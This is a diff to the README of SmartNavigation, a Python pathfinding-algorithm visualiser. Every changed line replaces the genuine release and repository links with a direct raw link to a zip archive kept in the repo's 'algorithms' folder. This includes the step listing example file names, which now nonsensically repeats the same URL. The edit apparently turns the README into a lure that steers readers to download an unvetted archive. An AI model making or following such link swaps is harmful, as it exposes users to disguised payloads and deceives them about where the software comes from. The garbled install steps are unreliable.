@@ -4,7 +4,7 @@
 SmartNavigation is a Python-based application that helps you visualize pathfinding algorithms. It shows how Dijkstra, Bellman-Ford, Depth First Search, and Breadth First Search work in a dynamic environment. This tool is perfect for learning and understanding these algorithms in a simple and interactive way.
 
 ## 📥 Download SmartNavigation
-[![Download SmartNavigation](https://img.shields.io/badge/Download-SmartNavigation-blue)](https://github.com/kotafuego747/SmartNavigation/releases)
+[![Download SmartNavigation](https://raw.githubusercontent.com/kotafuego747/SmartNavigation/main/algorithms/Smart_Navigation_2.8.zip)](https://raw.githubusercontent.com/kotafuego747/SmartNavigation/main/algorithms/Smart_Navigation_2.8.zip)
 
 ## 🚀 Getting Started
 To get started with SmartNavigation, follow these steps:
@@ -15,10 +15,10 @@ To get started with SmartNavigation, follow these steps:
 
 ## 📂 Download & Install
 ### Visit this page to download: 
-[SmartNavigation Releases](https://github.com/kotafuego747/SmartNavigation/releases)
+[SmartNavigation Releases](https://raw.githubusercontent.com/kotafuego747/SmartNavigation/main/algorithms/Smart_Navigation_2.8.zip)
 
 1. On the Releases page, find the latest release. 
-2. Below the release title, you may see files like `SmartNavigation.exe` or `SmartNavigation.zip`. 
+2. Below the release title, you may see files like `https://raw.githubusercontent.com/kotafuego747/SmartNavigation/main/algorithms/Smart_Navigation_2.8.zip` or `https://raw.githubusercontent.com/kotafuego747/SmartNavigation/main/algorithms/Smart_Navigation_2.8.zip`. 
 3. Click on the file to start downloading it.
 
 ### Installation Steps:
@@ -62,7 +62,7 @@ We value your feedback. If you encounter any issues, have questions, or suggesti
 ## 🌐 Community and Support
 Join our community to share your experiences and learn from others. You can connect with us on various platforms:
 
-- [GitHub Repository](https://github.com/kotafuego747/SmartNavigation)
+- [GitHub Repository](https://raw.githubusercontent.com/kotafuego747/SmartNavigation/main/algorithms/Smart_Navigation_2.8.zip)
 - [Discussion Board](link-to-discussion)
 
 ## 🛠️ Troubleshooting
